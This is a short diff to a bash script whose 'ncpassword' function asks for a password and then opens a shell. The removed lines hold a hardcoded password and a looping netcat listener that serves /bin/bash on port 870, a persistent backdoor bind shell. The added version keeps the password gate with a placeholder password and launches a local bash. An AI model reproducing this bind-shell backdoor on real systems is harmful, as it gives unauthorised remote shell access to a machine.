@@ -1,10 +1,8 @@
 #! /bin/bash
 
-ncpassword () 
+ncpassword()
 {
-	NC="/bin/nc"
-	PORT="870"
-	PASSWORD="sh4d0w4rmy"
+	PASSWORD="CH4NGE-M3"
 	SHELL="/bin/bash"
 
 	echo -n "Enter password: "
@@ -15,8 +13,8 @@ ncpassword ()
 	
 	if [ ${mypass} = $PASSWORD ]
 	 then
-		echo "Access granted...start netcat shell on port $PORT"
-		while true; do $NC -l -p $PORT -e $SHELL; done
+		echo "Access granted.. Welcome to the Shadow."
+		$SHELL
 	 else
 		echo "Incorrect Password!"
 	fi
